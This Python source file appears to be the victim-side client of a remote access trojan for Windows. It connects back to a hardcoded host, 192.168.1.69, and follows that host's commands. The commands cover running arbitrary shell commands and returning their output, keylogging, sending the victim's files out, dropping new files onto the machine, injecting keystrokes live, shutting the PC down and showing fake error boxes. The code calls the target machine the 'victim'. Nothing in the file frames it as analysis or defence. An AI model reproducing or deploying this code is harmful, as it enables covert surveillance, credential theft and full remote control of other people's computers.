import socket
import threading
from pynput.keyboard import Key, Listener, Controller
import os
from playsound import playsound
from win32con import VK_CAPITAL
from win32api import GetKeyState
import keyboard, time
import subprocess as sp
#functionalities Code
keys = ['Key.space', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
        'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','A','B','C','D','E','F','G','H','I','J',
        'K','L','M','N','P','Q','R','S','T','U','V','W','Y','Z', "1", '2', '3', '4', '5', '6',
        '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '?', ',', '.',
        '/', ';', ':', '[', ']', '{', '}', '~', '`', '_', '-', '+', '=', '|']
keyloggerString = ""

def keylogger(key):
    global keyloggerString
    letter = str(key).replace("'", "")

    if GetKeyState(VK_CAPITAL):
        if key == Key.backspace:
            back = len(keyloggerString) - 1
            keyloggerString = keyloggerString[:back]
            print(keyloggerString)
        if key == Key.space:
            keyloggerString += " "
            print(keyloggerString)

        else:
            if letter in keys:
                keyloggerString += letter.upper()
                print(keyloggerString)

    else:
        if key == Key.backspace:
            back = len(keyloggerString) - 1
            keyloggerString = keyloggerString[:back]
            print(keyloggerString)
        if key == Key.space:
            keyloggerString += " "
            print(keyloggerString)

        else:
            if letter in keys:
                keyloggerString += letter
            print(keyloggerString)
        if key == Key.esc:
            try:
                return False
            except:
                return False

def startKeylogger():
    CLIENT.send("?public/Keylogger is on!".encode(format))
    with Listener(on_press=keylogger) as i:
        i.join()
def stopKeylogger():
    for i in range(3):
        keyboard.press("esc")
    
def fileTransfer(dir, nickname):
    global FILESOCKET
    try:
        directory = dir.replace("/", "\\")
        print(directory)
        with open(directory, "rb") as f:
            while True:
                bytes_read = f.read(8192)
                if not bytes_read:
                    break
                FILESOCKET.sendall(bytes_read)

        time.sleep(7)
        CLIENT.send(f"?response {nickname}/File recieved!".encode(format))
    except:
        CLIENT.send(f"?response {nickname}/Something errored while sending the file, check directories.".encode(format))

#live typing
def liveTyping():
    while True:
        keyy = CLIENT.recv(1024).decode(format)
        print(f"key pressed: {keyy}")
        if keyy.replace("'", "") in keys:
            if keyy.replace("'", "") == "Key.space":
                keyboard.write(" ")
            if not keyy.replace("'", "") == "Key.space":
                keyboard.write(keyy.replace("'", ""))

        keyboardpynput = Controller()
        if not keyy in keys:
            if keyy == "Key.cmd":
                keyboardpynput.press(Key.cmd)
                keyboardpynput.release(Key.cmd)
            if keyy == "Key.caps_lock":
                keyboardpynput.press(Key.caps_lock)
                keyboardpynput.release(Key.caps_lock)
            if keyy == "Key.enter":
                keyboardpynput.press(Key.enter)
                keyboardpynput.release(Key.enter)
            if keyy == "Key.delete":
                keyboardpynput.press(Key.delete)
                keyboardpynput.release(Key.delete)
            if keyy == "Key.backspace":
                keyboardpynput.press(Key.backspace)
                keyboardpynput.release(Key.backspace)
            if keyy == "Key.page_down":
                keyboardpynput.press(Key.page_down)
                keyboardpynput.release(Key.page_down)
            if keyy == "Key.page_up":
                keyboardpynput.press(Key.enter)
                keyboardpynput.release(Key.enter)
            if keyy == "Key.left":
                keyboardpynput.press(Key.left)
                keyboardpynput.release(Key.left)
            if keyy == "Key.right":
                keyboardpynput.press(Key.right)
                keyboardpynput.release(Key.right)
            if keyy == "Key.up":
                keyboardpynput.press(Key.up)
                keyboardpynput.release(Key.up)
            if keyy == "Key.down":
                keyboardpynput.press(Key.down)
                keyboardpynput.release(Key.down)
            if keyy == "Key.tab":
                keyboardpynput.press(Key.tab)
                keyboardpynput.release(Key.tab)
        if keyy == "?livetype off":
            CLIENT.send("?public/Live Typing is off!".encode(format))
            CLIENT.send("?public/?exitlivetype".encode(format))
            break

def cmdResults(command, sock):
    print(sock)
    output = sp.getoutput(command)
    outputSplit = output.split("\n")
    for i in outputSplit:
        if i.strip() != "":
            CLIENT.send(f"?cmdresult {sock}/{i}".encode(format))
            time.sleep(0.05)

def fileRecieve(saveDir, nickame):
    try:
        with open(saveDir, "wb") as f:
                while True:
                    FILESOCKET.settimeout(7.0)
                    bytes_read = FILESOCKET.recv(8192)
                    print(bytes_read)
                    if not bytes_read:
                        break
                    f.write(bytes_read)

    except socket.timeout:
        CLIENT.send(f"?response {nickame}/File has been recieved to victim sucessfully!".encode(format))
    except:
        print("error recieve file!")
        CLIENT.send(f"?response {nickame}/The file request has failed recheck directories entered.".encode(format))
    
    

format = "utf-8"
notConnected = True
COMMANDSPORT = 8080
FILESOCKETPORT = 9090


def connection():
    global notConnected
    try:
        CLIENT.connect(("192.168.1.69", COMMANDSPORT))
        FILESOCKET.connect(("192.168.1.69", FILESOCKETPORT))
        print("Connection established!")
        notConnected = False
    
    except:
        print("Connection failed")

    
def initializeSocket():
    global notConnected, CLIENT, IP, FILESOCKET
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    FILESOCKET = socket.socket()
    IP = socket.gethostbyname(socket.gethostname())
    notConnected = True
    while notConnected:
        thread = threading.Thread(target=connection).start()
        print("Attempting connection...")
        time.sleep(4)


initializeSocket()
def recievingMessages():
    global keyloggerString
    while True:
        try:
            message = CLIENT.recv(1024).decode(format)
        
            # print(message)
            if "?Volume" in message:
                keyboard = Controller()
                value = message[message.index(" ") + 1:]

                for i in range(50):
                    keyboard.press(Key.media_volume_down)
                    keyboard.release(Key.media_volume_down)
                for i in range(int(int(value) / 2)):

                    keyboard.press(Key.media_volume_up)
                    keyboard.release(Key.media_volume_up)
            if "?Shutdown" in message:
                ind = message.index("/")
                msg = message[10: ind]
                countdown = message[ind + 1:]
                CLIENT.send(f"?public/Victim pc is shutting down in {countdown} seconds with a message of: {msg}".encode(format))
                os.system(f'shutdown /s /t {countdown} /c "{msg}"')

            if "?play" in message:
                spaceIndex = message.index("/")
                name = message[spaceIndex + 1:]
                nickname = message[message.index(" ") + 1: message.index("/")]
                audios = os.listdir()

                if(name.strip() in audios):
                    print(name.strip())
                    playsound(name.strip())
                else:
                    CLIENT.send(f"?response {nickname}/not a sound".encode(format))
            if "?errorbox" in message:
                seperator = message.index("/")
                errortitle = message[10: seperator]
                errormessage = message[seperator + 1:]
                file = open("error.vbs", "w")
                file.write(f'x=msgbox("{errormessage}", 0+48, "{errortitle}")')
                file.close()
                os.system("start error.vbs")

            if "?keylogger" in message:
                action = message[message.index(" ") + 1:]
                if action == "on":
                    keyloggerString = ""
                    thread = threading.Thread(target= startKeylogger).start()
                    print("keyloggeron")
                if action == "off":
                    stopKeylogger()
                    CLIENT.send(f"?public/Results: {keyloggerString}".encode(format))

            if "?livetype" in message:
                action = message[message.index(" ") + 1:]
                if action == "on":
                    CLIENT.send("?public/Live Typing is on!".encode(format))
                    liveTyping()

            if "?cmdcommand" in message:
                command = message[message.index("/") + 1:]
                sock = message[message.index(" ") + 1: message.index("/")]
                # CLIENT.send(f"?clientsock {sock}/{message}".encode(format))
                cmdresults = threading.Thread(target=cmdResults, args=(command,sock)).start()
                
            if "?requestfile" in message:
                directory = message.index("/")
                nicknameindex2 = message[message.index(" ") + 1: message.index("/")]
                file = threading.Thread(target=fileTransfer, args=(message[directory + 1:],nicknameindex2)).start()
            
            if "?recieveFile" in message:
                saveDir = message[message.index("/") + 1:]
                nicknameIndex = message[message.index(" ") + 1: message.index("/")]
                recieveFile = threading.Thread(target=fileRecieve, args=(saveDir, nicknameIndex)).start()

        except:
            print("Server has gone offline reconnecting...")
            initializeSocket()
def sendMessage(message):
    CLIENT.send(message.encode(format))


messageListener = threading.Thread(target=recievingMessages).start()
